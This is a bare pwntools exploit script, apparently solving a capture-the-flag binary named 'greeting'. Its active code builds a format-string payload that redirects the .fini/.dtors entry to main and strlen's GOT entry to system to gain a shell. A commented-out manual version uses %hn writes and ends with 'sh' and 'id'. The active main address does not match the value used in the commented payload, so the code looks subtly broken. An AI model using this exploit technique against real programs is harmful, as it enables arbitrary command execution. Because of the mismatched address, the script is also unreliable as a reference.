#!/usr/bin/env python

from pwn import *

# conn = process('greeting')

fini_addr = 0x08049934
main_addr = 0x8000f4a0

strlen_addr = 0x8049a54
system_addr = 0x08048490

writes = {fini_addr : main_addr, strlen_addr: system_addr}
offset = 43
payload = fmtstr_payload(offset, writes, numbwritten=0)
print(payload)
# res = conn.recv()
# log.info(res)
# p.send(payload)
#
# conn.sendline(payload)
#
# res = conn.recv()
# log.info(res)
#
# conn.interactive()
#
# from pwn import *
# import struct
#
# def pI(addr):
#     return struct.pack('<I', addr)
#
# strlen_plt  = 0x08049a54
# dtors_addr  = 0x08049934
#
# payload = b'AA'
# payload += p32(strlen_plt + 2)  #12
# payload += p32(strlen_plt)      #13
# payload += p32(dtors_addr)      #14
#
# payload += b'%' + str(0x0804-32).encode() + b'x'
# payload += b'%12$hn'
#
# payload += b'%' + str(0x8490-0x0804).encode() + b'x'
# payload += b'%13$hn'
#
# payload += b'%' + str(0x85ed-0x8490).encode() + b'x'
# payload += b'%14$hn'
#
# payload += b'\n'
#
# payload += b'sh'
# payload += b'\n'
#
# payload += b'id'
# payload += b'\n'
#
# print(payload)
